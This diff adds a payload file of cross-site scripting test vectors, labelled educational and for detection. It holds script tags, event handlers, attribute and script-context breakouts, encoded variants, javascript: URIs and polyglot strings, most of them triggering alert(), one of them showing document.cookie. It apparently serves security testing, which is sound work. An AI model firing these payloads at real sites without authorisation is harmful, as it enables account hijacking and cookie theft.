@@ -1,0 +1,76 @@
+# XSS Payload File
+# Educational payloads for Cross-Site Scripting detection
+# Each line represents a different XSS test vector
+# Lines starting with # are comments and will be ignored
+
+# Basic script injection
+<script>alert(1)</script>
+<script>alert('XSS')</script>
+<script>alert(document.cookie)</script>
+<script>alert(window.origin)</script>
+
+# Event handler injection
+<img src=x onerror=alert(1)>
+<img src=x onerror=alert('XSS')>
+<body onload=alert(1)>
+<svg/onload=alert(1)>
+<svg onload=alert('XSS')>
+
+# HTML tag injection with events
+<div onmouseover=alert(1)>test</div>
+<iframe onload=alert(1)>
+<input onfocus=alert(1) autofocus>
+
+# Breaking out of attributes
+" onload=alert(1) "
+' onload=alert(1) '
+"><script>alert(1)</script>
+'><script>alert(1)</script>
+
+# Breaking out of script context
+</script><script>alert(1)</script>
+';alert(1);//
+";alert(1);//
+'-alert(1)-'
+"-alert(1)-"
+
+# Encoded variations
+&#60;script&#62;alert(1)&#60;/script&#62;
+\x3cscript\x3ealert(1)\x3c/script\x3e
+<scr<script>ipt>alert(1)</scr</script>ipt>
+
+# Alternative script execution
+<object data="javascript:alert(1)">
+<embed src="javascript:alert(1)">
+<a href="javascript:alert(1)">click</a>
+
+# DOM-based XSS vectors
+<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
+<script>document.write('<img src=x onerror=alert(1)>')</script>
+<script>window.location='javascript:alert(1)'</script>
+
+# CSS-based XSS
+<style>@import'javascript:alert(1)';</style>
+<link rel="stylesheet" href="javascript:alert(1)">
+
+# SVG-based XSS
+<svg><script>alert(1)</script></svg>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s>
+
+# Template injection attempts (if applicable)
+{{alert(1)}}
+${alert(1)}
+#{alert(1)}
+
+# XML-based XSS
+<![CDATA[<script>alert(1)</script>]]>
+
+# Meta tag injection
+<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
+
+# Form-based XSS
+<form action="javascript:alert(1)"><input type="submit"></form>
+
+# Polyglot payloads (work in multiple contexts)
+javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert()//>
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
